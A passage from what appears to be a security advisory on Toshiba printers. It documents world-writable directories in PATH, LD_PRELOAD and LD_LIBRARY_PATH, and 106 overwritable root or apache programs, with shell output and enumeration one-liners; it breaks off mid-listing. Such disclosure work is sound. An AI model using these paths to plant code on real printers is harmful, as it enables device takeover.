<p>It was observed that the Toshiba printers are configured with an insecure <code>$PATH</code> variable:</p>
<pre>
bash-4.1# echo $PATH
<font color=red>/home/SYSROM_SRC/build/release/bin:/home/SYSROM_SRC/build/release/sbin:/home/SYSROM_SRC/build/release/bin:
/home/SYSROM_SRC/build/release/sbin:/home/SYSROM_SRC/build/release/bin:/home/SYSROM_SRC/build/release/sbin</font>:
/bin:/usr/bin:/sbin:/usr/sbin:/sbin:/bin/:/usr/bin/:/usr/sbin:/sbin:/bin/:/usr/bin/:/usr/sbin:/sbin:/bin/:/usr/bin/:/usr/sbin
bash-4.1#
</pre>

<p>The <code>$PATH</code> variable contains several directories with insecure permissions (777) allowing any attacker to plant malicious programs that will be then executed instead of regular programs:</p>
<ul>
<li><code>/home/SYSROM_SRC/build/release/bin</code></li>
<li><code>/home/SYSROM_SRC/build/release/sbin</code></li>
</ul>
<p>These 2 directories are specified multiple times and are configured with the 777 permissions:</p>
<p>Insecure permissions of <code>/home/SYSROM_SRC/build/release/bin</code> and <code>/home/SYSROM_SRC/build/release</code>:</p>
<pre>
bash-4.1# ls -la /home/SYSROM_SRC/bin
lrwxrwxrwx 1 root trusted 17 Mar 14 16:34 /home/SYSROM_SRC/bin -> build/release/bin
bash-4.1# ls -la /home/SYSROM_SRC/build/release/bin
total 176508
<font color=red>drwxrwxrwx  2 root root       36864 Mar 15 16:12 .
drwxrwxrwx 19 root root        4096 Mar 14 16:28 ..</font>
lrwxrwxrwx  1 root root          25 Mar 14 16:27 2to3 -> ../../thirdparty/bin/2to3
lrwxrwxrwx  1 root root          29 Mar 14 16:27 2to3-3.5 -> ../../thirdparty/bin/2to3-3.5
-rwxrwxrwx  1 root root      120381 Dec  6 01:56 ALABAMA_Large.ico
-rwxrwxrwx  1 root root       25214 Dec  6 01:56 ALABAMA_Small.ico
-rwxrwxrwx  1 root root      143884 Dec  6 01:56 ALABAMA_f_Large.ico
-rwxrwxrwx  1 root root       25214 Dec  6 01:56 ALABAMA_f_Small.ico
lrwxrwxrwx  1 root root          39 Mar 14 16:27 AppLicenseDataBase -> ../../thirdparty/bin/AppLicenseDataBase
...
</pre>

<p>Insecure permissions of <code>/home/SYSROM_SRC/build/release/sbin</code> and <code>/home/SYSROM_SRC/build/release</code>:</p>
<pre>
bash-4.1# ls -la /home/SYSROM_SRC/sbin
lrwxrwxrwx 1 root root 18 Mar 14 16:34 /home/SYSROM_SRC/sbin -> build/release/sbin
bash-4.1# ls -la /home/SYSROM_SRC/build/release/sbin
total 608
<font color=red>drwxrwxrwx  2 root root  4096 Dec  6 01:40 .
drwxrwxrwx 19 root root  4096 Mar 14 16:28 ..</font>
-rwxrwxrwx  1 root root  4467 Dec  6 01:40 CheckAndRemovePerms.sh
lrwxrwxrwx  1 root root    26 Mar 14 16:27 afpd -> ../../thirdparty/sbin/afpd
lrwxrwxrwx  1 root root    30 Mar 14 16:27 arpaname -> ../../thirdparty/sbin/arpaname
lrwxrwxrwx  1 root root    28 Mar 14 16:27 atalkd -> ../../thirdparty/sbin/atalkd
lrwxrwxrwx  1 root root    30 Mar 14 16:27 cnid_dbd -> ../../thirdparty/sbin/cnid_dbd
lrwxrwxrwx  1 root root    32 Mar 14 16:27 cnid_metad -> ../../thirdparty/sbin/cnid_metad
lrwxrwxrwx  1 root root    34 Mar 14 16:27 ddns-confgen -> ../../thirdparty/sbin/ddns-confgen
...
</pre>

<p>On a side note, the <code>/home/SYSROM_SRC</code> directory is highly insecure with incorrect permissions used everywhere:</p>
<pre>
bash-4.1# ls -la /home/SYSROM_SRC
total 52
drwxr-xr-x 9 root root    4096 Mar 14 16:34 .
drwxr-xr-x 4 root root    4096 Mar 14 16:28 ..
lrwxrwxrwx 1 root root      30 Mar 14 16:28 CBAHttpServer -> /registration/al/CBAHttpServer
lrwxrwxrwx 1 root root      20 Mar 14 16:27 HDBROOT -> /home/SYSROM_SRC/tmp
<font color=red>drwxrwxrwx 7 root root    4096 Dec  6 00:46 NoBuildItems</font>
lrwxrwxrwx 1 root root      28 Mar 14 16:28 Resources -> /registration/data/Resources
lrwxrwxrwx 1 root root      32 Mar 14 16:28 Resources_eBN -> /registration/data/Resources_eBN
-rwxr-xr-x 1 root root    5614 Mar 14 16:28 Startup.sh
lrwxrwxrwx 1 root root      40 Apr  6  2016 TopAccess -> /home/SYSROM_SRC/build/release/TopAccess
lrwxrwxrwx 1 root root      28 Mar 14 16:28 TopAccessPy -> /registration/al/TopAccessPy
lrwxrwxrwx 1 root root      23 Mar 14 16:28 WebAPI -> /registration/al/WebAPI
lrwxrwxrwx 1 root root      25 Mar 14 16:28 WebPanel -> /registration/al/WebPanel
lrwxrwxrwx 1 root trusted   17 Mar 14 16:34 bin -> build/release/bin
drwxr-xr-x 5 root root    4096 Apr  6  2016 build
<font color=red>drwxrwxrwx 2 root root    4096 Dec  6 01:13 config
drwxrwxrwx 3 root root    4096 Mar 14 16:28 data</font>
lrwxrwxrwx 1 root root      17 Mar 14 16:34 etc -> build/release/etc
-rwxr-xr-x 1 root root    1075 Mar 14 16:27 install_rip_ram.sh
<font color=red>drwxrwxrwx 4 root root    4096 Mar 14 16:34 jobdata</font>
lrwxrwxrwx 1 root trusted   17 Mar 14 16:34 lib -> build/release/lib
<font color=red>drwxrwxrwx 2 root root    4096 Dec  6 04:48 logs</font>
lrwxrwxrwx 1 root root      18 Mar 14 16:34 sbin -> build/release/sbin
<font color=red>-rwxrwxrwx 1 root root    3492 Dec  8  2017 setenv</font>
lrwxrwxrwx 1 root root      19 Mar 14 16:34 share -> build/release/share
drwxr-xr-x 3 root root    4096 Dec  6 04:48 var
bash-4.1#
</pre>

<p>An attacker can place any malicious program inside <code>/home/SYSROM_SRC/build/release/bin</code> or <code>/home/SYSROM_SRC/build/release/sbin</code> and they will be executed before legit programs that are stored in the regular UNIX directories (<code>/bin</code>, <code>/usr/bin</code>, <code>/sbin</code>, <code>/usr/sbin</code>).</p>
<p>An attacker can remotely compromise any Toshiba printer.</p>
<p><a id="lpe-rce-ld-preload"></a></p>
<h2>Details - Local Privilege Escalation and Remote Code Execution using insecure LD_PRELOAD</h2>
<p>Toshiba printers are vulnerable to a Local Privilege Escalation vulnerability because of an insecure LD_PRELOAD variable. This Local Privilege Escalation can be also exploited as a Remote Code Execution by uploading a malicious library using the <a href="#pre-auth-rces-upload">Pre-authenticated Remote Code Execution as root or apache and multiple Local Privilege Escalations</a> vulnerability.</p>
<p>Toshiba printers are configured with an insecure <code>LD_PRELOAD</code> variable:</p>
<pre><code>bash-4.1# printenv | grep LD_PRELOAD
LD_PRELOAD=/ramdisk/al/libGetNameInfoInterface.so:/ramdisk/al/libGetAddtInfoInterface.so:
bash-4.1#
</code></pre>
<p>The <code>$LD_PRELOAD</code> variable contains 2 libraries with insecure permissions (777) allowing any attacker to replace these libraries with malicious libraries that will be then executed:</p>
<ul>
<li><code>/ramdisk/al/libGetNameInfoInterface.so</code></li>
<li><code>/ramdisk/al/libGetAddtInfoInterface.so</code></li>
</ul>
<p>Checking the permissions of libraries defined in LD_PRELOAD:</p>
<pre>
bash-4.1# ls -la /ramdisk/al/libGetNameInfoInterface.so
<font color=red>-rwxrwxrwx 1 root root 70813 Dec  6 02:02 /ramdisk/al/libGetNameInfoInterface.so</font>
bash-4.1# s -la /ramdisk/al/libGetAddtInfoInterface.so
<font color=red>-rwxrwxrwx 1 root root 87311 Dec  6 02:02 /ramdisk/al/libGetAddtInfoInterface.so</font>
bash-4.1#
</pre>

<p>We can confirm these 2 libraries are loaded within programs inside the printers.</p>
<p>Using <code>/proc/$PID/maps</code>, we can list the libraries loaded inside the programs: these libraries are loaded inside all the programs running as root and apache in the printers:</p>
<pre><code>bash-4.1# cd /proc &amp;&amp; for i in */; do cat $i/cmdline &amp;&amp; echo &amp;&amp; grep ramdisk $i/maps;done
/home/SYSROM_SRC/build/release/bin/nqnd
77788000-77797000 r-xp 00000000 00:0d 10712      /ramdisk/al/libGetAddtInfoInterface.so
77797000-77799000 rw-p 0000e000 00:0d 10712      /ramdisk/al/libGetAddtInfoInterface.so
77799000-777a4000 r-xp 00000000 00:0d 7014       /ramdisk/al/libGetNameInfoInterface.so
777a4000-777a6000 rw-p 0000a000 00:0d 7014       /ramdisk/al/libGetNameInfoInterface.so
/home/SYSROM_SRC/build/release/bin/nqcs
7776d000-7777c000 r-xp 00000000 00:0d 10712      /ramdisk/al/libGetAddtInfoInterface.so
7777c000-7777e000 rw-p 0000e000 00:0d 10712      /ramdisk/al/libGetAddtInfoInterface.so
7777e000-77789000 r-xp 00000000 00:0d 7014       /ramdisk/al/libGetNameInfoInterface.so
77789000-7778b000 rw-p 0000a000 00:0d 7014       /ramdisk/al/libGetNameInfoInterface.so
[...]
/usr/local/ebx/bin/httpd -f /encryption/al/network/config/httpd.conf -k start
777b5000-777c4000 r-xp 00000000 00:0d 10712      /ramdisk/al/libGetAddtInfoInterface.so
777c4000-777c6000 rw-p 0000e000 00:0d 10712      /ramdisk/al/libGetAddtInfoInterface.so
777c7000-777d2000 r-xp 00000000 00:0d 7014       /ramdisk/al/libGetNameInfoInterface.so
777d2000-777d4000 rw-p 0000a000 00:0d 7014       /ramdisk/al/libGetNameInfoInterface.so
/usr/local/ebx/bin/httpd -f /encryption/al/network/config/httpd.conf -k start
777b5000-777c4000 r-xp 00000000 00:0d 10712      /ramdisk/al/libGetAddtInfoInterface.so
777c4000-777c6000 rw-p 0000e000 00:0d 10712      /ramdisk/al/libGetAddtInfoInterface.so
777c7000-777d2000 r-xp 00000000 00:0d 7014       /ramdisk/al/libGetNameInfoInterface.so
777d2000-777d4000 rw-p 0000a000 00:0d 7014       /ramdisk/al/libGetNameInfoInterface.so
[...]
./alusermgr
776f6000-77705000 r-xp 00000000 00:0d 10712      /ramdisk/al/libGetAddtInfoInterface.so
77705000-77707000 rw-p 0000e000 00:0d 10712      /ramdisk/al/libGetAddtInfoInterface.so
77707000-77712000 r-xp 00000000 00:0d 7014       /ramdisk/al/libGetNameInfoInterface.so
77712000-77714000 rw-p 0000a000 00:0d 7014       /ramdisk/al/libGetNameInfoInterface.so
./allicensemgmt
777dc000-777eb000 r-xp 00000000 00:0d 10712      /ramdisk/al/libGetAddtInfoInterface.so
777eb000-777ed000 rw-p 0000e000 00:0d 10712      /ramdisk/al/libGetAddtInfoInterface.so
777ed000-777f8000 r-xp 00000000 00:0d 7014       /ramdisk/al/libGetNameInfoInterface.so
777f8000-777fa000 rw-p 0000a000 00:0d 7014       /ramdisk/al/libGetNameInfoInterface.so
[...]
</code></pre>
<p>An attacker can remotely compromise any Toshiba printer.</p>
<p><a id="lpe-rce-ld-library-path"></a></p>
<h2>Details - Local Privilege Escalation and Remote Code Execution using insecure LD_LIBRARY_PATH</h2>
<p>Toshiba printers are vulnerable to a Local Privilege Escalation vulnerability because of an insecure LD_LIBRARY_PATH variable. This Local Privilege Escalation can be also exploited as a Remote Code Execution by uploading a malicious library using the <a href="#pre-auth-rces-upload">Pre-authenticated Remote Code Execution as root or apache and multiple Local Privilege Escalations</a> vulnerability.</p>
<p>Toshiba printers are configured with an insecure <code>$LD_LIBRARY_PATH</code> variable:</p>
<pre><code>bash-4.1# printenv|grep LD_LIBRARY_PATH
LD_LIBRARY_PATH=/home/SYSROM_SRC/build/release/lib:/mfp/lib:/home/SYSROM_SRC/NoBuildItems/common/lib:/home/SYSROM_SRC/build/thirdparty//plugins//platforminputcontexts/:/home/SYSROM_SRC/build/release/lib
bash-4.1#
</code></pre>
<p>The <code>$LD_LIBRARY_PATH</code> variable contains 4 directories insecure permissions (777) allowing any attacker to replace these libraries with malicious libraries that will be then executed:</p>
<ul>
<li><code>/home/SYSROM_SRC/build/release/lib</code></li>
<li><code>/mfp/lib</code></li>
<li><code>/home/SYSROM_SRC/NoBuildItems/common/lib</code></li>
<li><code>/home/SYSROM_SRC/build/thirdparty//plugins//platforminputcontexts/</code></li>
</ul>
<p>We can confirm these directories have insecure permissions and/or the files stored inside these directories have insecure permissions as shown below:</p>
<p>Insecure permissions of <code>/home/SYSROM_SRC/build/release/lib</code>:</p>
<pre>
bash-4.1# ls -la /home/SYSROM_SRC/build/release/lib 
total 391144
<font color=red>drwxrwxrwx  4 root root    65536 May 27 16:28 .</font>
drwxrwxrwx 19 root root     4096 May 27 16:28 ..
lrwxrwxrwx  1 root root       38 Apr  6  2016 ImageMagick-6.3.3 -> ../../thirdparty/lib/ImageMagick-6.3.3
lrwxrwxrwx  1 root root       38 Mar 14 16:27 ImageMagick-6.7.5 -> ../../thirdparty/lib/ImageMagick-6.7.5
lrwxrwxrwx  1 root root       15 Mar 14 16:27 al8021XNMO.so -> al8021XNMO.so.0
-rwxrwxrwx  1 root root   223011 Dec  6 01:58 al8021XNMO.so.0
lrwxrwxrwx  1 root root       14 Mar 14 16:27 alDDNSNMO.so -> alDDNSNMO.so.0
-rwxrwxrwx  1 root root   171442 Dec  6 01:59 alDDNSNMO.so.0
lrwxrwxrwx  1 root root       13 Mar 14 16:27 alDNSNMO.so -> alDNSNMO.so.0
[...]
</pre>

<p>Insecure permissions of <code>/mfp/lib</code>:</p>
<pre>
bash-4.1# ls -la /mfp/lib 
total 344308
drwxr-xr-x 2 root   root          12288 May 27 16:28 .
drwxr-xr-x 8 root   root           4096 May 27 16:28 ..
<font color=red>-rwxrwxrwx 1 root   root             75 Jan 11  2013 DirectoryCopy.txt
-rwxrwxrwx 1 root   root            203 Jun 29  2017 SharedFiles.ini
-rwxrwxrwx 1 root   root        6210326 Jun  9  2022 laser.so
-rwxrwxrwx 1 root   root       11386849 Jun  9  2022 laserc1x.so
-rwxrwxrwx 1 root   root         298388 Dec 17  2017 libAbbyyZlib.so
-rwxrwxrwx 1 root   root        1518996 Dec 17  2017 libBarcode.so
-rwxrwxrwx 1 root   root        1045032 Dec 17  2017 libBusinessCard.Analyser.so
[...]</font>
</pre>

<p>Insecure permissions of <code>/home/SYSROM_SRC/NoBuildItems/common/lib</code>:</p>
<pre>
bash-4.1# ls -la /home/SYSROM_SRC/NoBuildItems/common/lib 
total 49580
<font color=red>drwxrwxrwx 2 root root     4096 May 27 16:27 .</font>
drwxrwxrwx 4 root root     4096 Dec  6 00:21 ..
-rwxrwxrwx 1 root root   624082 Dec  6 04:53 libCryptolib.so
-rwxrwxrwx 1 root root   624082 Dec  6 04:53 libCryptolib.so.0
-rwxrwxrwx 1 root root   624082 Apr 20  2018 libCryptolib.so.0.0.0
-rwxrwxrwx 1 root root 22366570 Jun  4  2018 libFREmbed.so
lrwxrwxrwx 1 root root       14 Mar 14 16:27 libasicif.so -> libasicif.so.1
lrwxrwxrwx 1 root root       16 Mar 14 16:27 libasicif.so.1 -> libasicif.so.1.0
-rwxrwxrwx 1 root root    12649 Apr  2  2016 libasicif.so.1.0
[...]
</pre>

<p>Insecure permissions of <code>/home/SYSROM_SRC/build/thirdparty//plugins//platforminputcontexts/</code>:</p>
<pre>
bash-4.1# ls -la /home/SYSROM_SRC/build/thirdparty//plugins//platforminputcontexts/ 
total 13036
<font color=red>drwxrwxrwx  2 510 510     4096 Sep 13  2019 .</font>
drwxrwxrwx 18 510 510     4096 Sep 13  2019 ..
-rwxrwxrwx  1 510 510    84844 Aug 25  2016 libibusplatforminputcontextplugin.so
-rwxrwxrwx  1 510 510 13252081 Sep 13  2019 libscreenkeyboardplugin.so
bash-4.1#
</pre>

<p><u>On a side note, all the libraries have also insecure permissions in the previous listing.</u></p>
<p>An attacker can remotely compromise any Toshiba printer.</p>
<p><a id="lpe-rce-106-programs"></a></p>
<h2>Details - Local Privilege Escalation and Remote Code Execution using insecure permissions for 106 programs</h2>
<p>Some vendor-specific programs are running inside Toshiba printers. These programs run as root and have insecure permissions (777) allowing an attacker to replace these programs with malicious programs. This Local Privilege Escalation can be also exploited as a Remote Code Execution by uploading a malicious program using the <a href="#pre-auth-rces-upload">Pre-authenticated Remote Code Execution as root or apache and multiple Local Privilege Escalations</a> vulnerability.</p>
<p>Some programs are running as root, for example:</p>
<pre><code>bash-4.1# ps auxw | grep root
root      1448  0.0  0.7 143680 21860 ?        Sl   16:34   0:00 /home/SYSROM_SRC/build/release/bin/slapd -h ldap://127.0.0.1 -f /home/SYSROM_SRC/build/release/etc/openldap/slapd.conf -d 1
root      1460  0.0  0.2 387308  8036 ?        Sl   16:34   0:02 /home/SYSROM_SRC/bin/mapper firstboot=0
[...]
root      1487  0.0  0.3  53496 10184 ?        Sl   16:34   0:02 ./cissm -T 7 -d ssm.xml
root      1647  0.0  0.3  67568  9256 ?        Sl   16:34   0:02 ./cischeduler -S ramdisk
root      1648  0.0  0.3  49452 11852 ?        Sl   16:34   0:00 ./cisystemresourcemanager -T8
root      1650  0.0  0.3  50320 11112 ?        S    16:34   0:00 ./pipeMN -T8
root      1652  0.0  0.3  47372 10708 ?        S    16:34   0:00 ./cpe -T8
root      1653  0.0  0.2  35524  8888 ?        S    16:34   0:00 ./dem -T8
root      1654  0.0  0.4  53448 12588 ?        S    16:34   0:00 ./dim -T8
root      1655  0.1  0.4  96460 12128 ?        Sl   16:34   0:18 ./alboserver -T5
[...]
</code></pre>
<p>Using this one-liner, it is possible to list the file corresponding to programs running inside the printers:</p>
<p>Programs running as root:</p>
<pre><code>bash-4.1# for i in $(ps auxww | grep root | awk '{ print $11 }' | grep -v '^\[' | grep -v COMMAND | grep -v '(' | grep -v ':$' | grep -v 'supervising' | sort | uniq); do ls -la $(which "$(echo $i | sed -e 's#^\./##')");done
</code></pre>
<p>Running with a different user:</p>
<pre><code>for i in $(ps auxww | grep -v root | awk '{ print $11 }' | grep -v '^\[' | grep -v COMMAND | grep -v '(' | grep -v ':$' | grep -v 'supervising' | sort | uniq); do ls -la $(which "$(echo $i | sed -e 's#^\./##')");done
</code></pre>
<p>These commands allow to list 106 vulnerable programs found inside the printers.</p>
<p><a id="lpe-rce-3-programs"></a></p>
<h3>3 vulnerable programs not running as root</h3>
<p>3 programs have been identified as vulnerable (running with a low-privileged user and that can be overwritten by any local or remote attacker):</p>
<ul>
<li>/home/SYSROM_SRC/thirdparty/sbin/slpd</li>
<li>/usr/local/ebx/bin/httpd</li>
<li>/usr/local/ebx/httpd_worker/bin/httpd_worker</li>
</ul>
<p>Vulnerable programs not running as root:</p>
<pre><code>bash-4.1# for i in $(ps auxww | grep -v root | awk '{ print $11 }' | grep -v '^\[' | grep -v COMMAND | grep -v '(' | grep -v ':$' | grep -v 'supervising' | sort | uniq); do ls -la $(which "$(echo $i | sed -e 's#^\./##')");done

lrwxrwxrwx 1 root root 26 Mar 14 16:27 /home/SYSROM_SRC/bin/slpd -&gt; ../../thirdparty/sbin/slpd
-rwxrwxrwx 1 apache messagebus 656546 Dec  6 01:34 /usr/local/ebx/bin/httpd
-rwxrwxrwx 1 apache messagebus 665612 Dec  6 01:34 /usr/local/ebx/httpd_worker/bin/httpd_worker
bash-4.1#
</code></pre>
<p>When following the link to slpd, we can confirm it is also vulnerable:</p>
<pre><code>bash-4.1# ls -la /home/SYSROM_SRC/build/thirdparty/sbin/slpd
-rwxrwxrwx 1 root root 106023 Dec  6 01:27 /home/SYSROM_SRC/build/thirdparty/sbin/slpd
bash-4.1#
</code></pre>
<p><a id="lpe-rce-103-programs"></a></p>
<h3>103 vulnerable programs running as root</h3>
<p>103 programs have been identified as vulnerable (running as root and that can be overwritten by any local or remote attacker):</p>
<ul>
<li>/home/SYSROM_SRC/bin/alllmnr</li>
<li>/home/SYSROM_SRC/bin/dnsValidateDaemon</li>
<li>/home/SYSROM_SRC/bin/eBXDebugLogUtility</li>
<li>/home/SYSROM_SRC/bin/ipv6_daemon</li>
<li>/home/SYSROM_SRC/bin/mapper</li>
<li>/home/SYSROM_SRC/bin/syscallerr</li>
<li>/home/SYSROM_SRC/build/release/bin/agent_faxreceive</li>
<li>/home/SYSROM_SRC/build/release/bin/agent_faxtransmit</li>
<li>/home/SYSROM_SRC/build/release/bin/agent_ipfaxreceive</li>
<li>/home/SYSROM_SRC/build/release/bin/agent_ipfaxtransmit</li>
<li>/home/SYSROM_SRC/build/release/bin/agent_print</li>
<li>/home/SYSROM_SRC/build/release/bin/agent_rip</li>
<li>/home/SYSROM_SRC/build/release/bin/agent_scan</li>
<li>/home/SYSROM_SRC/build/release/bin/alaccountmgr</li>
<li>/home/SYSROM_SRC/build/release/bin/alAddressBookMgr</li>
<li>/home/SYSROM_SRC/build/release/bin/alappmanager</li>
<li>/home/SYSROM_SRC/build/release/bin/alboserver</li>
<li>/home/SYSROM_SRC/build/release/bin/alcbamanager</li>
<li>/home/SYSROM_SRC/build/release/bin/alCloning</li>
<li>/home/SYSROM_SRC/build/release/bin/aldevauthmgmtplugin</li>
<li>/home/SYSROM_SRC/build/release/bin/aldeviceconfigplugin</li>
<li>/home/SYSROM_SRC/build/release/bin/aldeviceserviceplugin</li>
<li>/home/SYSROM_SRC/build/release/bin/aleFilingmgr</li>
<li>/home/SYSROM_SRC/build/release/bin/aleSCL</li>
<li>/home/SYSROM_SRC/build/release/bin/alExportImport</li>
<li>/home/SYSROM_SRC/build/release/bin/alfilestoragem</li>
<li>/home/SYSROM_SRC/build/release/bin/alftpprintd</li>
<li>/home/SYSROM_SRC/build/release/bin/algrpmgr</li>
<li>/home/SYSROM_SRC/build/release/bin/alhddalertmgr</li>
<li>/home/SYSROM_SRC/build/release/bin/alhddbackuprestore</li>
<li>/home/SYSROM_SRC/build/release/bin/alhomedatamgr</li>
<li>/home/SYSROM_SRC/build/release/bin/alhp9100</li>
<li>/home/SYSROM_SRC/build/release/bin/alifaxreceive</li>
<li>/home/SYSROM_SRC/build/release/bin/alintegritychkmgr</li>
<li>/home/SYSROM_SRC/build/release/bin/aljobcontroller</li>
<li>/home/SYSROM_SRC/build/release/bin/aljobtemplatemgr</li>
<li>/home/SYSROM_SRC/build/release/bin/allicensemgmt</li>
<li>/home/SYSROM_SRC/build/release/bin/allld2d</li>
<li>/home/SYSROM_SRC/build/release/bin/alLogmanager</li>
<li>/home/SYSROM_SRC/build/release/bin/alLogRetriever</li>
<li>/home/SYSROM_SRC/build/release/bin/allprng</li>
<li>/home/SYSROM_SRC/build/release/bin/almailboxapplication</li>
<li>/home/SYSROM_SRC/build/release/bin/almaintenanceplugin</li>
<li>/home/SYSROM_SRC/build/release/bin/alnetefiRemoteifsr</li>
<li>/home/SYSROM_SRC/build/release/bin/alnfcplugin</li>
<li>/home/SYSROM_SRC/build/release/bin/alnsm</li>
<li>/home/SYSROM_SRC/build/release/bin/alpanel</li>
<li>/home/SYSROM_SRC/build/release/bin/alPanelStartLEDHandler</li>
<li>/home/SYSROM_SRC/build/release/bin/alPanelUIMessageHandler</li>
<li>/home/SYSROM_SRC/build/release/bin/alpdlfiltermanager</li>
<li>/home/SYSROM_SRC/build/release/bin/alpresentationresourcemgr</li>
<li>/home/SYSROM_SRC/build/release/bin/alprintmn</li>
<li>/home/SYSROM_SRC/build/release/bin/alreportmanager</li>
<li>/home/SYSROM_SRC/build/release/bin/alreportsmsgr</li>
<li>/home/SYSROM_SRC/build/release/bin/alrestrictionmode</li>
<li>/home/SYSROM_SRC/build/release/bin/alrolemgr</li>
<li>/home/SYSROM_SRC/build/release/bin/alsecurityconfiguration</li>
<li>/home/SYSROM_SRC/build/release/bin/alServiceUIPlugin</li>
<li>/home/SYSROM_SRC/build/release/bin/alsharedprintDp</li>
<li>/home/SYSROM_SRC/build/release/bin/alsoftwareupdateclient</li>
<li>/home/SYSROM_SRC/build/release/bin/alstage2</li>
<li>/home/SYSROM_SRC/build/release/bin/alUiFrameWork</li>
<li>/home/SYSROM_SRC/build/release/bin/alulm</li>
<li>/home/SYSROM_SRC/build/release/bin/alusbmscapplication</li>
<li>/home/SYSROM_SRC/build/release/bin/alusbPrint</li>
<li>/home/SYSROM_SRC/build/release/bin/aluserAuthMgr</li>
<li>/home/SYSROM_SRC/build/release/bin/alusermgr</li>
<li>/home/SYSROM_SRC/build/release/bin/alViewPlugin</li>
<li>/home/SYSROM_SRC/build/release/bin/alwsdiscovery</li>
<li>/home/SYSROM_SRC/build/release/bin/alwsmex</li>
<li>/home/SYSROM_SRC/build/release/bin/alwsprint</li>
<li>/home/SYSROM_SRC/build/release/bin/alwsscanner</li>
<li>/home/SYSROM_SRC/build/release/bin/armn</li>
<li>/home/SYSROM_SRC/build/release/bin/cipollproc</li>
<li>/home/SYSROM_SRC/build/release/bin/ciprioritymanager</li>
<li>/home/SYSROM_SRC/build/release/bin/cischeduler</li>
<li>/home/SYSROM_SRC/build/release/bin/cissm</li>
<li>/home/SYSROM_SRC/build/release/bin/cisystemresourcemanager</li>
<li>/home/SYSROM_SRC/build/release/bin/cpe</li>
<li>/home/SYSROM_SRC/build/release/bin/de_ipfax</li>
<li>/home/SYSROM_SRC/build/release/bin/dem</li>
<li>/home/SYSROM_SRC/build/release/bin/dim</li>
<li>/home/SYSROM_SRC/build/release/bin/ebx_dl</li>
<li>/home/SYSROM_SRC/build/release/bin/faxmilter</li>
<li>/home/SYSROM_SRC/build/release/bin/informationservice</li>
<li>/home/SYSROM_SRC/build/release/bin/notificationservice</li>
<li>/home/SYSROM_SRC/build/release/bin/pipeMN</li>
<li>/home/SYSROM_SRC/build/release/bin/sim</li>
<li>/home/SYSROM_SRC/build/release/bin/sljobmanagement</li>
<li>/home/SYSROM_SRC/build/release/bin/snmp_watchdog</li>
<li>/home/SYSROM_SRC/build/release/bin/ssdktimestamp</li>
<li>/home/SYSROM_SRC/build/release/bin/wfpc</li>
<li>/home/SYSROM_SRC/build/thirdparty/bin/alipp</li>
<li>/home/SYSROM_SRC/build/thirdparty/bin/dibbler-client</li>
<li>/home/SYSROM_SRC/build/thirdparty/bin/mDNSResponderPosix</li>
<li>/home/SYSROM_SRC/build/thirdparty/bin/nqcs</li>
<li>/home/SYSROM_SRC/build/thirdparty/bin/nqnd</li>
<li>/home/SYSROM_SRC/build/thirdparty/bin/python3.5</li>
<li>/home/SYSROM_SRC/build/thirdparty/bin/vsftpd</li>
<li>/home/SYSROM_SRC/build/thirdparty/libexec/slapd</li>
<li>/home/SYSROM_SRC/build/thirdparty/sbin/snmpd</li>
<li>/usr/local/ebx/bin/httpd</li>
<li>/usr/local/ebx/httpd_worker/bin/httpd_worker</li>
</ul>
<p>The analysis is shown below.</p>
<p>Vulnerable programs running as root, with insecure permissions:</p>
<pre>
bash-4.1# for i in $(ps auxww | grep root | awk '{ print $11 }' | grep -v '^\[' | grep -v COMMAND | grep -v '(' | grep -v ':$' | grep -v 'supervising' | sort | uniq); do ls -la $(which "$(echo $i | sed -e 's#^\./##')");done
<font color=red>-rwxrwxrwx 1 root root 562669 Dec  6 04:10 /home/SYSROM_SRC/build/release/bin/agent_faxreceive
-rwxrwxrwx 1 root root 608397 Dec  6 04:11 /home/SYSROM_SRC/build/release/bin/agent_faxtransmit
-rwxrwxrwx 1 root root 561916 Dec  6 04:38 /home/SYSROM_SRC/build/release/bin/agent_ipfaxreceive
-rwxrwxrwx 1 root root 594505 Dec  6 04:38 /home/SYSROM_SRC/build/release/bin/agent_ipfaxtransmit
-rwxrwxrwx 1 root root 572434 Dec  6 04:11 /home/SYSROM_SRC/build/release/bin/agent_print
-rwxrwxrwx 1 root root 556369 Dec  6 04:10 /home/SYSROM_SRC/build/release/bin/agent_rip
-rwxrwxrwx 1 root root 557372 Dec  6 04:10 /home/SYSROM_SRC/build/release/bin/agent_scan
-rwxrwxrwx 1 root root 2191621 Dec  6 02:13 /home/SYSROM_SRC/build/release/bin/alAddressBookMgr
-rwxrwxrwx 1 root root 939045 Dec  6 02:22 /home/SYSROM_SRC/build/release/bin/alCloning
-rwxrwxrwx 1 root root 1019576 Dec  6 02:20 /home/SYSROM_SRC/build/release/bin/alExportImport
-rwxrwxrwx 1 root root 1354094 Dec  6 02:15 /home/SYSROM_SRC/build/release/bin/alLogRetriever
-rwxrwxrwx 1 root root 734343 Dec  6 02:21 /home/SYSROM_SRC/build/release/bin/alLogmanager
-rwxrwxrwx 1 root root 241886 Dec  6 02:24 /home/SYSROM_SRC/build/release/bin/alPanelStartLEDHandler
-rwxrwxrwx 1 root root 2282226 Dec  6 02:24 /home/SYSROM_SRC/build/release/bin/alPanelUIMessageHandler
-rwxrwxrwx 1 root root 211250 Dec  6 02:22 /home/SYSROM_SRC/build/release/bin/alServiceUIPlugin
-rwxrwxrwx 1 root root 6104526 Dec  6 03:51 /home/SYSROM_SRC/build/release/bin/alUiFrameWork
-rwxrwxrwx 1 root root 673942 Dec  6 02:20 /home/SYSROM_SRC/build/release/bin/alViewPlugin
-rwxrwxrwx 1 root root 2896387 Dec  6 02:12 /home/SYSROM_SRC/build/release/bin/alaccountmgr
-rwxrwxrwx 1 root root 2917038 Dec  6 02:26 /home/SYSROM_SRC/build/release/bin/alappmanager
-rwxrwxrwx 1 root root 1055271 Dec  6 01:49 /home/SYSROM_SRC/build/release/bin/alboserver
-rwxrwxrwx 1 root root 322981 Dec  6 02:08 /home/SYSROM_SRC/build/release/bin/alcbamanager
-rwxrwxrwx 1 root root 2528851 Dec  6 02:22 /home/SYSROM_SRC/build/release/bin/aldevauthmgmtplugin
-rwxrwxrwx 1 root root 4386856 Dec  6 03:30 /home/SYSROM_SRC/build/release/bin/aldeviceconfigplugin
-rwxrwxrwx 1 root root 4300169 Dec  6 03:25 /home/SYSROM_SRC/build/release/bin/aldeviceserviceplugin
-rwxrwxrwx 1 root root 1915456 Dec  6 02:14 /home/SYSROM_SRC/build/release/bin/aleFilingmgr
-rwxrwxrwx 1 root root 580229 Dec  6 01:50 /home/SYSROM_SRC/build/release/bin/alfilestoragem
-rwxrwxrwx 1 root root 509900 Dec  6 02:21 /home/SYSROM_SRC/build/release/bin/algrpmgr
